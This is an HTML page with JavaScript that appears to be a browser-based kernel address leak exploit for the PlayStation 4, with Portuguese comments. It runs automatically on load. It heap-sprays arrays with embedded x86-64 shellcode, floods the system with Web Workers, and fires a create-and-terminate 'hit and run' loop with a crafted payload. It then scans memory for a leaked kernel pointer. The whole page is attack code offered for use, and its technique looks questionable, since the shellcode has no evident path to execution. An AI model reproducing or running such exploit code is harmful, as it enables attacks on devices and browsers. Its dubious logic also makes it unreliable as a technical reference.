<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 NANO LEAKER</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { color: #0f0; border-bottom: 2px solid #0f0; display: inline-block; }
        #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        #result { font-size: 2.5em; color: #ff0; font-weight: bold; background: #222; padding: 15px; display: none; word-wrap: break-word; }
        .phase1 { color: #0ff; }
        .phase2 { color: #ff0; }
        .phase3 { color: #f0f; }
        .success { background-color: #050 !important; color: #fff !important; border: 2px solid #0f0; }
    </style>
</head>
<body>

    <h1>NANO LEAKER (HIT & RUN)</h1>
    <div id="status">AGUARDANDO...</div>
    <div id="result"></div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        const ADDR_BYTE_3 = 0x40; // Endereço 0x40...

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // SHELLCODE: Escreve o endereço do Kernel no próprio array e retorna
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp] 
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax
            0xC3,                         // ret
            0x00, 0x00, 0x00, 0x00,       // [SLOT DADOS]
            0x00, 0x00, 0x00, 0x00        // [SLOT DADOS]
        ]);

        function runExploit() {
            // 1. SPRAY (Prepara o terreno)
            document.getElementById('status').innerText = "1. PREPARANDO ARMADILHA...";
            document.getElementById('status').className = "phase1";
            
            setTimeout(() => {
                try {
                    const code32 = new Uint32Array(code.buffer);
                    // 250 arrays é um bom equilíbrio
                    for(let i=0; i<250; i++) { 
                        let arr = new Uint32Array(0x4000); 
                        for(let k=0; k < arr.length; k += code32.length) {
                            for(let j=0; j < code32.length; j++) {
                                if (k+j < arr.length) arr[k+j] = code32[j];
                            }
                        }
                        heapSpray.push(arr);
                    }
                    
                    document.getElementById('status').innerText = "2. SUBINDO PRESSÃO DO KERNEL...";
                    startWorkers();
                    
                } catch(e) {
                    document.getElementById('status').innerText = "ERRO OOM. Reinicie o console agora.";
                }
            }, 500);
        }

        function startWorkers() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `WORKERS: ${workers.length}...`;
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "3. ESTABILIZANDO (AGUARDE)...";
                    setTimeout(performHitAndRun, 4000);
                }
            }, 30);
        }

        function performHitAndRun() {
            document.getElementById('status').innerText = ">>> ATAQUE EM CURSO (3s) <<<";
            document.getElementById('status').className = "phase2";

            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3;

            // Dispara metralhadora
            const attackInt = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
            }, 10);

            // EM 3 SEGUNDOS, MATAMOS TUDO PARA LIBERAR RAM
            setTimeout(() => {
                clearInterval(attackInt);
                document.getElementById('status').innerText = "4. LIMPANDO MEMÓRIA...";
                
                // MATA TUDO!
                workers.forEach(w => w.terminate());
                workers = [];
                
                // Agora que a RAM está livre, procuramos o tesouro
                setTimeout(scanForTreasure, 1000);
            }, 3000);
        }

        function scanForTreasure() {
            document.getElementById('status').innerText = "5. PROCURANDO LEAK NOS ARRAYS...";
            document.getElementById('status').className = "phase3";

            let found = false;
            
            // Varre o spray
            for(let i=0; i<heapSpray.length; i++) {
                const arr = heapSpray[i];
                // Procura assinatura nos primeiros bytes
                for(let k=4; k<64; k+=8) {
                    // Se o slot de dados não for zero...
                    if (arr[k] !== 0 && arr[k] !== 0xC3078948) {
                        // E se a parte alta parecer um endereço de kernel (não zero)
                        if (arr[k+1] !== 0) {
                            reportSuccess(arr[k], arr[k+1]);
                            found = true;
                            break;
                        }
                    }
                }
                if(found) break;
            }

            if(!found) {
                document.getElementById('status').innerText = "FALHA: NENHUM LEAK ENCONTRADO. Tente novamente.";
            }
        }

        function reportSuccess(low, high) {
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const addr = `0x${hHigh}${hLow}`;
            
            document.getElementById('status').innerText = "SUCESSO ABSOLUTO!";
            document.getElementById('status').className = "success";
            
            const res = document.getElementById('result');
            res.style.display = "block";
            res.innerText = addr;
        }

        setTimeout(runExploit, 1500);

    </script>
</body>
</html>
